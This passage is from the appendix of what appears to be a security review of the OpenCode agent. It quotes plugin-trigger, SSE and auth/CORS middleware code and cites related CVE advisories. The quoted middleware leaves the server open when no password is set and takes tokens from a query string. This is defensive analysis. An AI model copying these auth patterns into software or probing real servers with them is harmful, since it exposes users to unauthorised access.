        { tool: key, sessionID: ctx.sessionID, callID: opts.toolCallId },
        { args },
      )
      yield* ctx.ask({ permission: key, metadata: {}, patterns: ["*"], always: ["*"] })
      const result = yield* Effect.promise(() => execute(args, opts))
      yield* plugin.trigger(
        "tool.execute.after",
        { tool: key, sessionID: ctx.sessionID, callID: opts.toolCallId, args },
        result,
      )
      // ...
    }),
  )

// prompt.ts:584–667  — task tool (subagent spawn)
yield* plugin.trigger(
  "tool.execute.before",
  { tool: TaskTool.id, sessionID, callID: part.id },
  { args: taskArgs },
)
// ...
const result = yield* taskTool.execute(taskArgs, { agent: task.agent, /* ... */ extra: { bypassAgentCheck: true, promptOps }, /* ... */ })
// ...
yield* plugin.trigger(
  "tool.execute.after",
  { tool: TaskTool.id, sessionID, callID: part.id, args: taskArgs },
  result,
)
```

### A.3 `packages/opencode/src/plugin/index.ts` — `trigger` implementation

```ts
// plugin/index.ts:263–276
const trigger = Effect.fn("Plugin.trigger")(function* <
  Name extends TriggerName,
  Input = Parameters<Required<Hooks>[Name]>[0],
  Output = Parameters<Required<Hooks>[Name]>[1],
>(name: Name, input: Input, output: Output) {
  if (!name) return output
  const s = yield* InstanceState.get(state)     // ← Instance-scoped; subagents share this
  for (const hook of s.hooks) {
    const fn = hook[name] as any
    if (!fn) continue
    yield* Effect.promise(async () => fn(input, output))
  }
  return output
})
```

### A.4 `packages/opencode/src/server/middleware.ts` — auth + CORS (full)

```ts
export const AuthMiddleware: MiddlewareHandler = (c, next) => {
  if (c.req.method === "OPTIONS") return next()
  const password = Flag.OPENCODE_SERVER_PASSWORD
  if (!password) return next()
  const username = Flag.OPENCODE_SERVER_USERNAME ?? "opencode"
  if (c.req.query("auth_token")) c.req.raw.headers.set("authorization", `Basic ${c.req.query("auth_token")}`)
  return basicAuth({ username, password })(c, next)
}

export function CorsMiddleware(opts?: { cors?: string[] }): MiddlewareHandler {
  return cors({
    maxAge: 86_400,
    origin(input) {
      if (!input) return
      if (input.startsWith("http://localhost:")) return input
      if (input.startsWith("http://127.0.0.1:")) return input
      if (input === "tauri://localhost" || input === "http://tauri.localhost" || input === "https://tauri.localhost") return input
      if (/^https:\/\/([a-z0-9-]+\.)*opencode\.ai$/.test(input)) return input
      if (opts?.cors?.includes(input)) return input
    },
  })
}
```

### A.5 `packages/opencode/src/server/instance/event.ts` — SSE envelope (excerpt)

```ts
// instance/event.ts:42–80
return streamSSE(c, async (stream) => {
  const q = new AsyncQueue<string | null>()
  let done = false

  q.push(JSON.stringify({ type: "server.connected", properties: {} }))

  const heartbeat = setInterval(() => {
    q.push(JSON.stringify({ type: "server.heartbeat", properties: {} }))
  }, 10_000)

  const unsub = Bus.subscribeAll((event) => {
    q.push(JSON.stringify(event))
    if (event.type === Bus.InstanceDisposed.type) stop()
  })

  stream.onAbort(stop)
  for await (const data of q) {
    if (data === null) return
    await stream.writeSSE({ data })
  }
})
```

---

## Appendix B — References

- OpenCode repo: https://github.com/sst/opencode (tag `v1.4.5` at commit `dfc72838d70bea6df14859e90c6df91507b5f406`)
- GHSA-vxw4-wv6m-9hhh / CVE-2026-22812 advisory (fetched via `gh api advisories`)
- GHSA-c83v-7274-4vgp / CVE-2026-22813 advisory
- Issue sst/opencode#5894 (closed 2026-04-15, no merged PR)
- npm registry: `https://registry.npmjs.org/opencode-ai` (dist-tag `latest = 1.4.5`)
- jellyclaw internal: `engine/SPEC.md §5.1 §15`, `engine/CVE-MITIGATION.md §1`, `patches/README.md`
